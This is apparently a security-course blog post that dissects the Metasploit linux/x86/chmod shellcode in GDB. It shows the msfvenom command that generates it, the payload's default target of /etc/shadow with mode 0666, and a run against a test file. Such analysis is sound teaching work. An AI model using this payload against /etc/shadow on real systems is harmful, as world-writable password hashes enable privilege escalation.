---
layout: post
title:  "SLAE Assignment 5.3 - Msfvenom linux/x86/chmod shellcode Analysis"
date:   2017-04-26
categories: certification
excerpt_separator: <!--more-->
---
<br />
Student **SLAE - 891**  
Github: [https://github.com/phackt/slae](https://github.com/phackt/slae)  
[http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/](http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)  
  
### Assignment 5.3:  
  
**Our Goal:**  
> *Take up at least 3 linux/x86 shellcodes using Msfpayload (now Msfvenom)*
 - *Use GDB/Ndisasm/Libemu to dissect the functionality of the shellcode*
 - *Present your analysis*  
<!--more-->
  
Hello everybody,  
  
Here we are for the last shellcode of the msfvenom serie. We will use this time the **linux/x86/chmod** shellcode and will analyse it thanks to GDB:  
```bash
# msfvenom -p linux/x86/chmod --payload-options
Options for payload/linux/x86/chmod:


       Name: Linux Chmod
       Module: payload/linux/x86/chmod
       Platform: Linux
       Arch: x86
       Needs Admin: No
       Total size: 36
       Rank: Normal

Provided by:
    kris katterjohn <katterjohn@gmail.com>

Basic options:
Name  Current          Setting     Required  Description
----  ---------------  --------    -----------
FILE  /etc/shadow      yes         Filename to chmod
MODE  0666             yes         File mode (octal)

Description:
  Runs chmod on specified file with specified mode
...
```
  
Let's generate the ELF:  
```bash
# msfvenom -p linux/x86/chmod FILE=/tmp/slae.txt -f elf -o chmod_slae
No platform was selected, choosing Msf::Module::Platform::Linux from the payload
No Arch selected, selecting Arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 38 bytes
Final size of elf file: 122 bytes
Saved as: chmod_slae
# ls -l /tmp/slae.txt 
-r--r--r-- 1 root root 0 avril 22 04:54 /tmp/slae.txt
# chmod +x ./chmod_slae && ./chmod_slae
# ls -l /tmp/slae.txt 
-rw-rw-rw- 1 root root 0 avril 22 04:54 /tmp/slae.txt
```
  
Perfect we see that our file **/tmp/slae.txt** has now the octal right **666** standing for **rw-rw-rw-**.  Let's have a look in gdb:  
```
# readelf -h ./chmod_slae
...
Adresse du point d'entrée:    0x8048054 
...
# gdb -q ./chmod_slae 
Reading symbols from ./chmod_slae...(no debugging symbols found)...done.
gdb-peda$ br *0x8048054
Breakpoint 1 at 0x8048054
gdb-peda$ run
gdb-peda$ disas $eip,+38
Dump of assembler code from 0x8048054 to 0x804807a:
=> 0x08048054:	cdq    
   0x08048055:	push   0xf
   0x08048057:	pop    eax
   0x08048058:	push   edx
   0x08048059:	call   0x804806c
   0x0804805e:	das    
   0x0804805f:	je     0x80480ce
   0x08048061:	jo     0x8048092
   0x08048063:	jae    0x80480d1
   0x08048065:	popa   
   0x08048066:	gs cs je 0x80480e2
   0x0804806a:	je     0x804806c
   0x0804806c:	pop    ebx
   0x0804806d:	push   0x1b6
   0x08048072:	pop    ecx
   0x08048073:	int    0x80
   0x08048075:	push   0x1
   0x08048077:	pop    eax
   0x08048078:	int    0x80
End of assembler dump.
```

Let's add some breakpoints on interesting opcodes:  
```bash
gdb-peda$ br *0x0804806c
Breakpoint 2 at 0x804806c
gdb-peda$ br *0x08048073
Breakpoint 3 at 0x8048073
gdb-peda$ br *0x08048078
Breakpoint 4 at 0x8048078
gdb-peda$ c
Continuing.
[----------------------------------registers-----------------------------------]
EAX: 0xf 
EBX: 0x0 
ECX: 0x0 
EDX: 0x0 
ESI: 0x0 
EDI: 0x0 
EBP: 0x0 
ESP: 0xbffff2c8 --> 0x804805e ("/tmp/slae.txt")
EIP: 0x804806c --> 0x1b6685b
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8048065:	popa   
   0x8048066:	gs cs je 0x80480e2
   0x804806a:	je     0x804806c
=> 0x804806c:	pop    ebx
   0x804806d:	push   0x1b6
   0x8048072:	pop    ecx
   0x8048073:	int    0x80
   0x8048075:	push   0x1
[------------------------------------stack-------------------------------------]
0000| 0xbffff2c8 --> 0x804805e ("/tmp/slae.txt")
0004| 0xbffff2cc --> 0x0 
0008| 0xbffff2d0 --> 0x1 
0012| 0xbffff2d4 --> 0xbffff478 ("/root/Documents/pentest/certs/slae/exam/assignment5.3/chmod_slae")
0016| 0xbffff2d8 --> 0x0 
0020| 0xbffff2dc --> 0xbffff4b9 ("XDG_VTNR=2")
0024| 0xbffff2e0 --> 0xbffff4c4 ("XDG_SESSION_ID=2")
0028| 0xbffff2e4 --> 0xbffff4d5 ("SSH_AGENT_PID=1067")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
```  
  
Notice that we are using [gdb-peda](https://github.com/longld/peda).  Thanks to the call technique the next instruction ``` pop ebx ``` will pop the address of the string */tmp/slae* in the EBX register.  
  
So we will have:  
```bash
EAX: 0xf 
EBX: 0x804805e (/tmp/slae.txt) 
```  
  
Finally if we stop at the address **0x8048073** just before our syscall:  
```bash
EAX: 0xf 
EBX: 0x804805e ("/tmp/slae.txt")
ECX: 0x1b6 
```
  
We will call ``` int chmod(const char *pathname, mode_t mode); ```. The second argument **0x1b6** is **666** in octal:  
```bash
# printf "%o\n" 0x1b6
666
```  
  
Let's go to the following breakpoint:  
```bash
EAX: 0x1 
EBX: 0x804805e (/tmp/slae.txt) 
```
  
We will call ``` void _exit(int status); ```, the exit status is not important in a shellcode execution context, so we won't add an opcode to set EBX.  

Finally, our shellcode will change the permissions of our file:  
```bash
gdb-peda$ n
[Inferior 1 (process 24785) exited with code 0136]
Warning: not running or target is remote
```
  
So we just finished our msfvenom shellcodes serie. Soon we will deal with polymorphic shellcodes and crypters.  
Hope you enjoyed this post.    
  
[Phackt](https://twitter.com/phackt_ul)